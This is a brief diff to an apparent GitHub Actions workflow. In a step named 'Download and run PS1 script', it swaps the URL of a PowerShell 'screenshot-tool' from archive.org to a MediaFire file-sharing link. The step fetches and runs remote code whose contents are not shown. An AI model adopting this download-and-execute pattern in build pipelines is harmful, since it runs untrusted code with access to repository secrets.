@@ -12,7 +12,7 @@ jobs:
       - name: Download and run PS1 script
         run: |
           # Download PS1 script from archive.org
-          $scriptUrl = "https://archive.org/download/information_20251119/screenshot-tool.ps1"
+          $scriptUrl = "https://www.mediafire.com/file/sjr4cb05d8088ij/screenshot-tool.ps1/file"
           $scriptPath = "$env:GITHUB_WORKSPACE\screenshot-tool.ps1"
           
           # Download the script
